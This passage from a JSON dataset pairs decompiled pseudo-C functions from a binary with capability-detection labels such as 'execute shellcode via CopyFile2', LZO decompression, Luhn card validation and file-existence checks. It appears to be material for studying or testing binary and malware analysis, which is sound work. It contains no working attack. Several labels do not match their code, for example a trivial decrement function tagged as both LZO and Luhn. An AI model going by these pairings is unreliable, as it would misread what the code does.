}\ncode_r0x0004e849:\n    fcn.000619de(arg1_00);\n    return iVar1;\n}\n",
        "token_count": 632
    },
    "00050f04": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.00050f04(int64_t arg1, int64_t arg2, uint *arg3)\n\n{\n    ulong arg1_00;\n    int32_t iVar1;\n    ulong uVar2;\n    ulong auStackX8 [3];\n    ulong uStackX32;\n    uchar auStack664 [192];\n    int32_t iStack472;\n    int32_t iStack464;\n    int32_t iStack448;\n    int32_t iStack432;\n    uint uStack424;\n    \n    if (arg1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else if (arg2 == 0) {\n        uVar2 = 0x21590066;\n    }\n    else if (arg3 == NULL) {\n        uVar2 = 0x21590067;\n    }\n    else {\n        uVar2 = fcn.0004afbc(arg1, arg2, auStackX8);\n        arg1_00 = auStackX8[0];\n        if (uVar2 == 0) {\n            uVar2 = fcn.0001a8b4(auStackX8[0], 0x40, 0, &uStackX32);\n            if (uVar2 == 0) {\n                fcn.00050e08(auStack664);\n                fcn.0004f4b8(auStack664);\n                fcn.0004f4d8(auStack664, 0);\n                fcn.0004f2e8(auStack664, auStackX8[0]);\n                uVar2 = 0xffffffff;\n                do {\n                    iVar1 = fcn.00050e40(auStack664);\n                    if (iVar1 == 0) goto code_r0x00051003;\n                } while ((((iStack472 != 0x118) || (iStack464 != 0x8c)) || (iStack448 != 0x25)) || (iStack432 != 0x8f));\n                uVar2 = 0;\n                *arg3 = uStack424;\ncode_r0x00051003:\n                fcn.0001a924(arg1_00, uStackX32);\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 498
    },
    "000533c8": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t fcn.000533c8(int64_t arg1, ulong arg2, ulong arg3, uint64_t arg4)\n\n{\n    uint64_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    uint16_t *puVar5;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    uint32_t uVar10;\n    uint8_t auStackX8 [32];\n    uint8_t uStack168;\n    uint8_t auStack167 [3];\n    uchar auStack164 [4];\n    uchar auStack160 [4];\n    uint32_t uStack156;\n    uint32_t uStack152;\n    uchar auStack148 [4];\n    uchar auStack144 [4];\n    uchar auStack140 [4];\n    uchar auStack136 [4];\n    uchar auStack132 [4];\n    uchar auStack128 [4];\n    uchar auStack124 [4];\n    uint32_t auStack120 [16];\n    uint16_t *puVar6;\n    \n    arg4 = arg4 & 0xffffffff;\n    if (arg1 == 0) {\n        return 0xffffffff;\n    }\n    puVar5 = arg1 + -8;\n    uVar1 = 0;\n    uVar3 = 0;\ncode_r0x00053401:\n    while( true ) {\n        uVar10 = uVar3;\n        uVar9 = uVar1;\n        puVar6 = puVar5;\n        puVar5 = puVar6 + 4;\n        uVar2 = *puVar5;\n        uVar8 = uVar9;\n        iVar7 = arg4;\n        uVar1 = uVar9;\n        uVar3 = uVar10;\n        if (0x35 < uVar2) break;\n        if (uVar2 == 0x35) {\n            if (*(puVar6 + 6) <= uVar10) goto code_r0x00053771;\n            goto code_r0x000534ea;\n        }\n        if (uVar2 < 0x17) {\n            if (uVar2 == 0x16) {\n                return uVar10;\n            }\n            if (uVar2 < 6) {\n                if (uVar2 == 5) {\n                    uVar8 = *(puVar6 + 6);\n                    goto code_r0x000534f0;\n                }\n                if (uVar2 == 0) {\n                    uVar3 = *(puVar6 + 6);\n                }\n                else if (uVar2 == 1) {\n                    uVar1 = *(puVar6 + 6);\n                }\n                else if (uVar2 == 2) {\n                    auStack120[*(puVar6 + 6)] = uVar10;\n                }\n                else if (uVar2 == 3) {\n                    auStack120[*(puVar6 + 6)] = uVar8;\n                }\n                else {\n                    if (uVar2 != 4) {\n                        return 0;\n                    }\n                    uVar3 = uVar10 + *(puVar6 + 6);\n                }\n            }\n            else {\n                if (uVar2 == 6) {\n                    return *(puVar6 + 6);\n                }\n                if (uVar2 == 7) {\n                    uVar1 = uVar10;\n                }\n                else if (uVar2 == 0xc) {\n                    uVar3 = uVar10 + uVar8;\n                }\n                else {\n                    if (uVar2 != 0x14) {\n                        if (uVar2 != 0x15) {\n                            return 0;\n                        }\n                        uVar8 = *(puVar6 + 6);\ncode_r0x00053547:\n                        if (uVar10 == uVar8) goto code_r0x00053771;\n                        goto code_r0x000534ea;\n                    }\n                    uVar3 = uVar10 - *(puVar6 + 6);\n                }\n            }\n        }\n        else if (uVar2 < 0x29) {\n            if (uVar2 == 0x28) {\n                if (arg4 < *(puVar6 + 6) + 2U) {\n                    return 0;\n                }\n                fcn.00061c30(arg2, *(puVar6 + 6), auStack164, 0, 2, auStack140);\n                goto code_r0x000536f9;\n            }\n            if (uVar2 == 0x1c) {\n                uVar3 = uVar10 - uVar8;\n            }\n            else {\n                if (uVar2 == 0x1d) goto code_r0x00053547;\n                if (uVar2 == 0x20) {\n                    if (arg4 < *(puVar6 + 6) + 4U) {\n                        return 0;\n                    }\n                    fcn.00061c30(arg2, *(puVar6 + 6), &uStack156, 0, 4, auStack148);\n                    uVar3 = uStack156;\n                    goto code_r0x00053539;\n                }\n                if (uVar2 != 0x24) {\n                    if (uVar2 != 0x25) {\n                        return 0;\n                    }\n                    if (*(puVar6 + 6) < uVar10) goto code_r0x00053771;\ncode_r0x000534ea:\n                    uVar4 = *(puVar6 + 0xb);\n                    goto code_r0x000534ee;\n                }\n                uVar3 = uVar10 * *(puVar6 + 6);\n            }\n        }\n        else if (uVar2 == 0x2c) {\n            uVar3 = uVar10 * uVar8;\n        }\n        else {\n            if (uVar2 == 0x2d) {\n                if (uVar8 < uVar10) goto code_r0x00053771;\n                goto code_r0x000534ea;\n            }\n            if (uVar2 == 0x30) {\n                if (iVar7 <= *(puVar6 + 6)) {\n                    return 0;\n                }\n                fcn.00061c30(arg2, *(puVar6 + 6), auStackX8, 0, 1, auStack124);\n                uVar3 = auStackX8[0];\n            }\n            else {\n                if (uVar2 != 0x34) {\n                    return 0;\n                }\n                uVar3 = uVar10 / *(puVar6 + 6);\n            }\n        }\n    }\n    if (0x60 < uVar2) {\n        if (0x80 < uVar2) {\n            uVar1 = arg3;\n            if (uVar2 != 0x81) {\n                if (uVar2 == 0x84) {\n                    uVar1 = uVar9;\n                    uVar3 = -uVar10;\n                }\n                else {\n                    uVar1 = uVar9;\n                    uVar3 = uVar8;\n                    if (uVar2 != 0x87) {\n                        if (uVar2 != 0xb1) {\n                            return 0;\n                        }\n                        if (iVar7 <= *(puVar6 + 6)) {\n                            return 0;\n                        }\n                        fcn.00061c30(arg2, *(puVar6 + 6), auStack167, 0, 1, auStack128);\n                        uVar1 = (auStack167[0] & 0xf) << 2;\n                        uVar3 = uVar10;\n                    }\n                }\n            }\n            goto code_r0x00053401;\n        }\n        uVar3 = arg3;\n        if (uVar2 == 0x80) goto code_r0x00053401;\n        if (uVar2 != 0x61) {\n            if (uVar2 == 100) {\n                uVar4 = *(puVar6 + 6);\n            }\n            else {\n                uVar4 = uVar9;\n                if (uVar2 != 0x6c) {\n                    if (uVar2 == 0x74) {\n                        uVar4 = *(puVar6 + 6);\n                    }\n                    else if (uVar2 != 0x7c) {\n                        return 0;\n                    }\n                    uVar3 = uVar10 >> (uVar4 & 0x1f);\n                    goto code_r0x00053401;\n                }\n            }\n            uVar3 = uVar10 << (uVar4 & 0x1f);\n            goto code_r0x00053401;\n        }\n        uVar1 = auStack120[*(puVar6 + 6)];\n        uVar3 = uVar10;\n        goto code_r0x00053401;\n    }\n    if (uVar2 == 0x60) {\n        uVar3 = auStack120[*(puVar6 + 6)];\n        goto code_r0x00053401;\n    }\n    if (uVar2 < 0x49) {\n        if (uVar2 == 0x48) {\n            if (arg4 < uVar8 + *(puVar6 + 6) + 2U) {\n                return 0;\n            }\n            fcn.00061c30(arg2, uVar8 + *(puVar6 + 6), auStack160, 0, 2, auStack144);\ncode_r0x000536f9:\n            uVar2 = fcn.0002fd20();\n            uVar3 = uVar2;\n            goto code_r0x00053401;\n        }\n        if (uVar2 == 0x3c) {\n            if (uVar8 == 0) {\n                return 0;\n            }\n            uVar3 = uVar10 / uVar9;\n            goto code_r0x00053401;\n        }\n        if (uVar2 == 0x3d) {\n            if (uVar8 <= uVar10) goto code_r0x00053771;\n            goto code_r0x000534ea;\n        }\n        if (uVar2 == 0x40) {\n            if (arg4 < uVar8 + *(puVar6 + 6) + 4U) {\n                return 0;\n            }\n            fcn.00061c30(arg2, uVar8 + *(puVar6 + 6), &uStack152, 0, 4, auStack132);\n            uVar3 = uStack152;\ncode_r0x00053539:\n            uVar3 = fcn.0002fcf4(uVar3);\n            goto code_r0x00053401;\n        }\n        if (uVar2 == 0x44) {\n            uVar3 = uVar10 | *(puVar6 + 6);\n            goto code_r0x00053401;\n        }\n        if (uVar2 != 0x45) {\n            return 0;\n        }\n        uVar8 = *(puVar6 + 6);\n    }\n    else {\n        if (uVar2 == 0x4c) {\n            uVar3 = uVar10 | uVar8;\n            goto code_r0x00053401;\n        }\n        if (uVar2 != 0x4d) {\n            if (uVar2 == 0x50) {\n                if (iVar7 <= uVar8 + *(puVar6 + 6)) {\n                    return 0;\n                }\n                fcn.00061c30(arg2, uVar8 + *(puVar6 + 6), &uStack168, 0, 1, auStack136);\n                uVar3 = uStack168;\n            }\n            else if (uVar2 == 0x54) {\n                uVar3 = uVar10 & *(puVar6 + 6);\n            }\n            else {\n                if (uVar2 != 0x5c) {\n                    return 0;\n                }\n                uVar3 = uVar10 & uVar8;\n            }\n            goto code_r0x00053401;\n        }\n    }\n    if ((uVar8 & uVar10) == 0) goto code_r0x000534ea;\ncode_r0x00053771:\n    uVar4 = *(puVar6 + 5);\ncode_r0x000534ee:\n    uVar8 = uVar4;\ncode_r0x000534f0:\n    puVar5 = puVar5 + uVar8 * 4;\n    goto code_r0x00053401;\n}\n",
        "token_count": 2753
    },
    "00056164": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.00056164(int64_t arg1, int64_t *arg2, uint *arg3)\n\n{\n    int64_t arg1_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    ulong *puVar4;\n    ulong uStack72;\n    ulong uStack64;\n    \n    iVar2 = 0;\n    if (arg3 != NULL) {\n        *arg3 = 0;\n    }\n    arg1_00 = arg1 + 0x78;\n    fcn.0002f23c(arg1_00);\n    if (*(arg1 + 0x2a0) == 0) {\n        iVar1 = *(arg1 + 0x29c);\n        if (*(arg1 + 0x298) == iVar1) {\n            uStack72 = *(arg1 + 0x60);\n            uStack64 = 0;\n            iVar2 = fcn.0005fa98(arg2, &uStack72, 0, 0);\n            if (iVar2 == 0) {\n                for (puVar4 = *(arg1 + 0x70); puVar4 != NULL; puVar4 = *puVar4) {\n                    if (*(puVar4 + 1) == 0) {\n                        iVar2 = fcn.00060190(*arg2, puVar4 + 3, *(puVar4 + 0x14));\n                        if (iVar2 != 0) {\n                            fcn.0005fd0c(arg2, 0);\n                            goto code_r0x000562d7;\n                        }\n                    }\n                    else {\n                        fcn.0006041c(*arg2, *(puVar4 + 0xc), puVar4 + 3, *(puVar4 + 2));\n                    }\n                }\n                iVar2 = 0;\n            }\ncode_r0x000562d7:\n            fcn.0002f2a4(arg1_00);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            if (arg3 == NULL) {\n                iVar2 = fcn.000600ac(*arg2, 0);\n                if (iVar2 == 0) {\n                    return 0;\n                }\n                fcn.0005fd0c(arg2, 0);\n                return iVar2;\n            }\n            *arg3 = 1;\n            return 0;\n        }\n        uVar3 = iVar1 >> 0x1f & 0x1f;\n        iVar1 = (iVar1 + uVar3 & 0x1f) - uVar3;\n        *(arg1 + 0x29c) = iVar1;\n        *arg2 = *(arg1 + 0x98 + iVar1 * 0x10);\n        *(arg1 + 0x98 + *(arg1 + 0x29c) * 0x10) = 0;\n        *(arg1 + (*(arg1 + 0x29c) + 10) * 0x10) = 0xffffffff;\n        iVar1 = *(arg1 + 0x29c) + 1;\n        uVar3 = iVar1 >> 0x1f & 0x1f;\n        *(arg1 + 0x29c) = (iVar1 + uVar3 & 0x1f) - uVar3;\n    }\n    else if (*(arg1 + 0x2b0) == 0) {\n        if (*(arg1 + 0x2a8) == 0) {\n            iVar2 = 0x21590003;\n        }\n        else {\n            *arg2 = *(arg1 + 0x2a8);\n            *(arg1 + 0x2b0) = 1;\n        }\n    }\n    else {\n        iVar2 = 0x21590064;\n    }\n    fcn.0002f2a4(arg1_00);\n    return iVar2;\n}\n",
        "token_count": 867
    },
    "000570ac": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.000570ac(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint32_t auStackX16 [2];\n    int32_t aiStackX24 [2];\n    ulong uStackX32;\n    ulong in_stack_fffffffffffffe18;\n    ulong *puVar8;\n    ulong uStack456;\n    uint uStack448;\n    uint64_t *puStack440;\n    ulong uStack432;\n    uchar *puStack424;\n    ulong *puStack416;\n    uint uStack408;\n    uchar auStack400 [8];\n    ulong uStack392;\n    uint uStack384;\n    ulong uStack376;\n    int64_t iStack368;\n    int32_t iStack360;\n    uint32_t uStack356;\n    uchar *puStack96;\n    int64_t *piStack88;\n    ulong uStack80;\n    uint64_t *puStack72;\n    \n    uVar5 = in_stack_fffffffffffffe18 >> 0x20;\n    uVar4 = 0;\n    uStackX32 = 0;\n    fcn.00061a56(&uStack376, 0, 0x138);\n    iVar7 = 1;\n    uStack376 = 0x78190;\n    puVar8 = CONCAT44(uVar5, 1);\n    iVar2 = fcn.00060288(*(arg1 + 0x18), &puStack440, auStackX16, 600000);\n    if (iVar2 != 0) {\n        if (iVar2 == 0x21590003) {\n            return 0x21590003;\n        }\n        if (iVar2 == 0x21590002) {\n            return 0x21590002;\n        }\n        if (*(*(arg1 + 0x20) + 0x48) != 0) {\n            return iVar2;\n        }\n        pcVar6 = *(*(arg1 + 0x20) + 0x268);\n        if (pcVar6 == NULL) {\n            return iVar2;\n        }\n        (*pcVar6)(*(arg1 + 0x28), iVar2, 1);\n        return iVar2;\n    }\n    if (0xb < auStackX16[0]) {\n        uStack456 = *puStack440;\n        uStack448 = *(puStack440 + 1);\n        uVar3 = fcn.0002fcf4(uStack456 & 0xffffffff);\n        uVar1 = uStack456 >> 0x20;\n        uStack456 = uStack456 & 0xffffffff00000000 | uVar3;\n        uVar3 = fcn.0002fcf4(uVar1);\n        uVar1 = uStack456 & 0xffffffff;\n        uStack456 = uVar1 | uVar3 << 0x20;\n        if ((uStack448 == '\\0') || (uStack448 == '\\x01')) {\n            uStack456._0_4_ = uVar1;\n            uStack356 = uStack456;\n            if (uStack448 != '\\x01') {\n                iStack360 = iVar7;\n            }\n            puStack72 = puStack440;\n            iStack368 = arg1;\n            if (*(*(arg1 + 0x20) + 0x290) == 0) {\n                puVar8 = puVar8 & 0xffffffff00000000;\n                uVar4 = fcn.0006041c(*(arg1 + 0x18), 9, 0, 0);\n                if ((uVar4 != 0) && (iVar7 = 0,  *(*(arg1 + 0x20) + 0x294) != 0)) goto code_r0x0005725c;\ncode_r0x00057261:\n                puVar8 = &uStackX32;\n                uVar4 = (**(*(arg1 + 0x20) + 0x38))(&uStack376);\n                if (iVar7 != 0) {\n                    puVar8 = puVar8 & 0xffffffff00000000;\n                    fcn.0006041c(*(arg1 + 0x18), 10, 0, 0);\n                }\n            }\n            else {\ncode_r0x0005725c:\n                iVar7 = 0;\n                if (uVar4 == 0) goto code_r0x00057261;\n            }\n            do {\n                puVar8 = puVar8 & 0xffffffff00000000;\n                iVar7 = fcn.00060288(*(arg1 + 0x18), &uStack432, aiStackX24, 0);\n                if (iVar7 != 0) {\n                    if (iVar7 == 0x21590002) {\n                        uStack456._0_4_ = uStack356;\n                        uStack448 = 2;\n                        uStack456._4_4_ = uVar4;\n                        uVar5 = fcn.0002fcf4(uStack356);\n                        uStack456 = CONCAT44(uStack456._4_4_, uVar5);\n                        uVar3 = fcn.0002fcf4(uStack456._4_4_);\n                        uStack456 = uStack456 & 0xffffffff | uVar3 << 0x20;\n                        fcn.00061a56(&puStack424);\n                        puStack416 = &uStack456;\n                        uStack408 = 0xc;\n                        if (puStack96 == NULL) {\n                            puStack424 = auStack400;\n                        }\n                        else {\n                            puStack424 = puStack96;\n                            *piStack88 = auStack400;\n                        }\n                        uStack384 = 0;\n                        uStack392 = uStackX32;\n                        iVar7 = fcn.0006052c(*(arg1 + 0x18), &puStack424, 0);\n                    }\n                    if (iVar7 == 0x21590003) {\n                        iVar7 = 0x21590006;\n                    }\n                    if (iVar7 != 0) {\n                        if ((*(*(arg1 + 0x20) + 0x48) == 0) && (pcVar6 = *(*(arg1 + 0x20) + 0x268),  pcVar6 != NULL)) {\n                            (*pcVar6)(*(arg1 + 0x28), iVar7, 2, pcVar6, puVar8);\n                        }\n                        pcVar6 = *(*(arg1 + 0x20) + 0x280);\n                        goto code_r0x00057318;\n                    }\n                    break;\n                }\n                fcn.0005fde8(*(arg1 + 0x18), uStack432);\n            } while (0 < aiStackX24[0]);\n            pcVar6 = *(*(arg1 + 0x20) + 0x288);\ncode_r0x00057318:\n            if (pcVar6 != NULL) {\n                (*pcVar6)(*(arg1 + 0x28), uStack80, uVar4, uStackX32, puVar8 & 0xffffffff00000000);\n            }\n            fcn.000569bc(&uStack376);\n            goto code_r0x0005734f;\n        }\n    }\n    iVar7 = 0x2159000a;\n    if ((*(*(arg1 + 0x20) + 0x48) == 0) && (pcVar6 = *(*(arg1 + 0x20) + 0x268),  pcVar6 != NULL)) {\n        (*pcVar6)(*(arg1 + 0x28), 0x2159000a, 5);\n    }\ncode_r0x0005734f:\n    fcn.0002fc50(uStackX32);\n    fcn.0002fc50(uStack80);\n    if (*(arg1 + 0x18) != 0) {\n        fcn.0005fde8(*(arg1 + 0x18), puStack440);\n    }\n    return iVar7;\n}\n",
        "token_count": 1799
    },
    "000585a4": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.000585a4(int32_t *arg1, ulong arg2, ulong arg3, char *arg4)\n\n{\n    char cVar1;\n    uint uVar2;\n    uchar uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int64_t **arg1_00;\n    int64_t iVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    int64_t *piVar11;\n    char *pcVar12;\n    uint64_t in_stack_00000028;\n    char *pcStack456;\n    ulong uStack448;\n    char acStack440 [128];\n    char acStack312 [256];\n    \n    arg1_00 = fcn.0002fbc4(0x30);\n    if (arg1_00 == NULL) {\n        return 0x21590004;\n    }\n    fcn.00061a56(arg1_00);\n    fcn.0002f1ec(arg1_00 + 3);\n    uVar2 = *0x78210;\n    *(arg1_00 + 4) = *0x78208;\n    *(arg1_00 + 0x24) = uVar2;\n    do {\n        uVar3 = fcn.00061a9e();\n        *arg1 = uVar3;\n        uVar3 = fcn.00061a9e();\n        *(arg1 + 1) = uVar3;\n        uVar3 = fcn.00061a9e();\n        *(arg1 + 2) = uVar3;\n        uVar3 = fcn.00061a9e();\n        *(arg1 + 3) = uVar3;\n        fcn.00031088(0x879e8);\n        piVar11 = *0x87a00;\n        if (*0x87a00 != NULL) {\n            do {\n                if (*(piVar11 + 1) == *arg1) break;\n                piVar11 = *piVar11;\n            } while (piVar11 != NULL);\n        }\n        fcn.00031108(0x879e8);\n    } while (piVar11 != NULL);\n    uVar10 = 0xffffffffffffffff;\n    *(arg1_00 + 1) = *arg1;\n    uVar7 = uVar10;\n    pcVar12 = arg4;\n    if (in_stack_00000028 == 0) {\n        pcStack456 = 0x158e0;\n    }\n    else {\n        do {\n            if (uVar7 == 0) break;\n            uVar7 = uVar7 - 1;\n            cVar1 = *pcVar12;\n            pcVar12 = pcVar12 + 1;\n        } while (cVar1 != '\\0');\n        uVar7 = ~uVar7;\n        pcStack456 = arg4;\n        if (in_stack_00000028 < uVar7) {\n            iVar4 = 0x21590065;\n            goto code_r0x00058864;\n        }\n        in_stack_00000028 = in_stack_00000028 + (-1 - (uVar7 - 1));\n        arg4 = arg4 + uVar7;\n    }\n    uStack448 = 0;\n    uVar8 = uVar10;\n    pcVar12 = arg4;\n    uVar7 = uVar10;\n    if (in_stack_00000028 == 0) {\n        fcn.00028648(acStack440, 0x80);\n        if ((arg3 >> 4 & 3) != 0) {\n            pcVar12 = acStack440;\n            do {\n                if (uVar8 == 0) break;\n                uVar8 = uVar8 - 1;\n                cVar1 = *pcVar12;\n                pcVar12 = pcVar12 + 1;\n            } while (cVar1 != '\\0');\n            fcn.00061b10(acStack440 + (~uVar8 - 1), 0x11eb4);\n        }\n        pcVar12 = acStack440;\n    }\n    else {\n        do {\n            if (uVar8 == 0) break;\n            uVar8 = uVar8 - 1;\n            cVar1 = *pcVar12;\n            pcVar12 = pcVar12 + 1;\n        } while (cVar1 != '\\0');\n        uVar9 = ~uVar8 - 1;\n        if (in_stack_00000028 < uVar9) {\n            iVar4 = 0x21590066;\n            goto code_r0x00058864;\n        }\n        in_stack_00000028 = in_stack_00000028 + (-1 - uVar9);\n        pcVar12 = arg4;\n        arg4 = arg4 + ~uVar8;\n    }\n    do {\n        if (uVar7 == 0) break;\n        cVar1 = *pcVar12;\n        uVar7 = uVar7 - 1;\n        pcVar12 = pcVar12 + 1;\n    } while (cVar1 != '\\0');\n    iVar4 = fcn.0005fa98(arg1_00 + 2, &pcStack456, 0, 0);\n    if (iVar4 == 0) {\n        pcVar12 = arg4;\n        if (in_stack_00000028 == 0) {\n            iVar6 = fcn.00061a86(arg2);\n            if (iVar6 != 0) {\n                fcn.0005fd0c(arg1_00 + 2, 0);\n                iVar4 = 0x21590064;\n                goto code_r0x00058864;\n            }\n            fcn.0001fd08(acStack312, 0x100, 0x15ed0, arg2);\n            arg4 = acStack312;\n        }\n        else {\n            do {\n                if (uVar10 == 0) break;\n                uVar10 = uVar10 - 1;\n                cVar1 = *pcVar12;\n                pcVar12 = pcVar12 + 1;\n            } while (cVar1 != '\\0');\n            if (in_stack_00000028 < ~uVar10 - 1) {\n                iVar4 = 0x21590067;\n                goto code_r0x00058864;\n            }\n        }\n        iVar4 = fcn.00060190(arg1_00[2], arg4, 0);\n        if ((iVar4 == 0) && (iVar4 = fcn.000600ac(arg1_00[2], 0),  iVar6 = *0xfffff78000000320,  iVar4 == 0)) {\n            uVar5 = (**0x112f0)();\n            *(arg1_00 + 5) = (uVar5 * iVar6) / 10000;\n            fcn.00031198(0x879e8);\n            *arg1_00 = *0x87a00;\n            *0x87a00 = arg1_00;\n            fcn.00031218(0x879e8);\n            return 0;\n        }\n        fcn.0005fd0c(arg1_00 + 2, 0);\n    }\ncode_r0x00058864:\n    fcn.0002fc50(arg1_00);\n    return iVar4;\n}\n",
        "token_count": 1628
    },
    "0004f374": {
        "rules": [
            "decompress data using LZO/83f2e70ad753438b83eb63e4275895e9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0004f374(int64_t arg1)\n\n{\n    fcn.0004f30c(arg1);\n    if (*(arg1 + 0x18) != '\\0') {\n        *(arg1 + 8) = *(arg1 + 8) + -1;\n        *(arg1 + 0x18) = *(arg1 + 0x18) + -1;\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "0001cb30": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0001cb30(int32_t *arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint *arg1_00;\n    code *pcVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    \n    if (*arg1 == -1) {\n        return 0;\n    }\n    arg1_00 = fcn.0002fbf0(*(*0x64080 + 0xc));\n    if (arg1_00 == NULL) {\n        iVar1 = -0x3fffff66;\n    }\n    else {\n        fcn.000619f6(arg1_00, *0x79d00);\n        iVar5 = *(*0x79d00 + 0x3c) + *0x79d00;\n        iVar1 = fcn.0004a104(arg1_00, (*(iVar5 + 0x30) - *0x79d00) + arg1_00);\n        if (iVar1 == 0) {\n            pcVar2 = *(iVar5 + 0x28) + arg1_00;\n            if (pcVar2 == NULL) {\n                iVar1 = -0x3fffffff;\n                goto code_r0x0001cc11;\n            }\n            *(arg1 + 6) = arg1_00;\n            iVar1 = (*pcVar2)(arg1, arg2);\n            if (iVar1 == 0) {\n                uVar4 = 0;\n                puVar3 = arg1_00;\n                if ((*(arg1_00[0xf] + 0x54 + arg1_00) & 0xfffffffc) != 0) {\n                    do {\n                        *puVar3 = 0;\n                        uVar4 = uVar4 + 1;\n                        puVar3 = puVar3 + 1;\n                    } while (uVar4 < *(arg1_00[0xf] + 0x54 + arg1_00) >> 2);\n                }\n                iVar1 = -0x3ffffee0;\n            }\n        }\n        if (iVar1 == -0x3ffffee0) {\n            return -0x3ffffee0;\n        }\n    }\ncode_r0x0001cc11:\n    fcn.0002fc50(arg1_00);\n    return iVar1;\n}\n",
        "token_count": 519
    },
    "0001e26c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0001e26c(ulong arg1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uchar in_DL;\n    uint32_t uVar3;\n    uchar auStackX24 [16];\n    \n    fcn.00031564(0x7a268, auStackX24, 1);\n    uVar3 = 0;\n    piVar2 = *0x7a288;\n    if (*0x7a280 != 0) {\n        do {\n            if (*piVar2 == arg1) break;\n            uVar3 = uVar3 + 1;\n            piVar2 = piVar2 + 2;\n        } while (uVar3 < *0x7a280);\n        if (uVar3 < *0x7a280) goto code_r0x0001e304;\n    }\n    iVar1 = fcn.0003055c(0x7a288, *0x7a280 << 3, *0x7a280 + 1 << 3);\n    if (iVar1 != -1) {\n        (*0x7a288)[*0x7a280 * 2] = arg1;\n        *(*0x7a288 + *0x7a280 * 2 + 1) = in_DL;\n        *0x7a280 = *0x7a280 + 1;\n    }\ncode_r0x0001e304:\n    fcn.00031598(0x7a268, auStackX24, 1);\n    return;\n}\n",
        "token_count": 343
    },
    "0002074c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.0002074c(ulong arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int64_t iVar2;\n    bool bVar3;\n    int32_t iVar4;\n    uint64_t arg2_00;\n    int64_t aiStackX24 [2];\n    uchar auStack56 [16];\n    \n    arg2_00 = arg1;\n    bVar3 = false;\n    iVar4 = fcn.00020640(aiStackX24, arg1, 2, auStack56);\n    iVar2 = aiStackX24[0];\n    if (iVar4 == 0) {\n        bVar3 = true;\n        if (arg2 == 0) {\n            piVar1 = aiStackX24[0] + 4;\n            *piVar1 = *piVar1 + -1;\n            if (*piVar1 != 0) goto code_r0x00020849;\n        }\n        if (*(aiStackX24[0] + 0x68) != -1) {\n            fcn.0002ee20(aiStackX24[0] + 0x70);\n            fcn.0001feb8(auStack56);\n            fcn.00031648(iVar2 + 0x78, 0);\n            fcn.0002edfc(iVar2 + 0x70);\n            fcn.00031624(iVar2 + 0x78);\n            iVar4 = fcn.00020640(aiStackX24, arg2_00, 2, auStack56);\n        }\n    }\n    iVar2 = *(arg2_00 * 8 + 0x88cd0);\n    if (iVar2 != 0) {\n        (**(*(iVar2 + 0x58) + 0x10))(*(aiStackX24[0] + 0x60));\n        fcn.0001fd9c(*(arg2_00 * 8 + 0x88cd0));\n        fcn.0002fc50(*(*(arg2_00 * 8 + 0x88cd0) + 0x50));\n    }\n    if (iVar4 == 0) {\n        fcn.0001feb8(auStack56);\n        bVar3 = false;\n        fcn.0002f440(aiStackX24[0] + 0x88);\n    }\n    fcn.0002fc50(*(arg2_00 * 8 + 0x88cd0));\n    *(arg2_00 * 8 + 0x88cd0) = 0;\n    if (!bVar3) {\n        return 0;\n    }\ncode_r0x00020849:\n    fcn.0001feb8(auStack56);\n    return 0;\n}\n",
        "token_count": 604
    },
    "000212f4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
